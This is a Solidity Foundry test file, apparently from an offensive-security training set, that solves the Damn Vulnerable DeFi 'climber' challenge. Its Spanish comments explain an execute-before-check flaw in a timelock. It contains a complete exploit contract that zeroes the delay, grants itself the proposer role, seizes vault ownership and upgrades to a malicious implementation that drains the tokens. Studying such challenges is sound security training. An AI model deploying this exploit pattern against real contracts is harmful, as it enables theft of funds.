// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/*
 * NEXUS Offensive · training/dvd · reto "climber"
 *
 * CLASE DE BUG: effects-antes-de-checks en un timelock. `execute` ejecuta las
 *   llamadas ANTES de comprobar que la operación estaba agendada y lista. Se
 *   arma un lote auto-autorizante: poner el delay en 0, concederse PROPOSER,
 *   transferir la propiedad del vault al atacante, y agendar el propio lote.
 *   Al terminar el loop, la operación "ya está lista" y la comprobación pasa.
 *   Siendo dueño del vault (UUPS), se actualiza a una implementación que drena.
 *
 * FAMILIA: Control de acceso / gobernanza (relacionado con FL — autorización).
 *
 * INVARIANTE QUE LO ATRAPA:
 *   El delay del timelock (y cualquier acción con timelock) no puede cambiarse
 *   sin pasar por una operación agendada con su delay cumplido. Se sostiene al
 *   inicio (delay = 1h, inmutable desde fuera) y se rompe (delay → 0 al vuelo).
 */
contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()),
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper))
                )
            )
        );
        timelock = ClimberTimelock(payable(vault.owner()));
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_climber() public checkSolvedByPlayer {
        // INV al inicio: el delay está fijo (1h) y no puede cambiarse desde fuera.
        assertEq(timelock.delay(), TIMELOCK_DELAY, "INV debe sostenerse al inicio");

        ClimberAttacker attacker = new ClimberAttacker(timelock, address(vault), address(token), recovery);
        attacker.exploit();

        // INV rota: el delay se cambió a 0 ejecutando una operación no agendada.
        console.log("delay del timelock tras el exploit:", timelock.delay());
        assertEq(timelock.delay(), 0, "INV rota: el delay se bypasseo");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

interface IUUPS {
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

/// @notice Implementación maliciosa del vault: drena todos los tokens.
contract MaliciousVault is UUPSUpgradeable {
    function drain(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

/// @notice Arma y dispara el lote auto-autorizante, luego actualiza y drena.
contract ClimberAttacker {
    ClimberTimelock public timelock;
    address public vault;
    address public token;
    address public recovery;

    address[] targets;
    uint256[] values;
    bytes[] elements;
    bytes32 constant SALT = bytes32("nexus-offensive");

    constructor(ClimberTimelock _timelock, address _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function exploit() external {
        targets = new address[](4);
        values = new uint256[](4);
        elements = new bytes[](4);

        // 1) delay -> 0 (updateDelay solo lo puede llamar el propio timelock).
        targets[0] = address(timelock);
        elements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
        // 2) concederse PROPOSER_ROLE (el timelock es su propio admin).
        targets[1] = address(timelock);
        elements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        // 3) transferir la propiedad del vault a este atacante.
        targets[2] = vault;
        elements[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        // 4) agendar ESTE MISMO lote (ya con PROPOSER y delay 0 -> queda "listo").
        targets[3] = address(this);
        elements[3] = abi.encodeWithSignature("scheduleBatch()");

        timelock.execute(targets, values, elements, SALT);

        // Ahora somos dueños del vault: upgrade a impl maliciosa que drena.
        MaliciousVault mal = new MaliciousVault();
        IUUPS(vault).upgradeToAndCall(address(mal), abi.encodeWithSignature("drain(address,address)", token, recovery));
    }

    function scheduleBatch() external {
        timelock.schedule(targets, values, elements, SALT);
    }
}
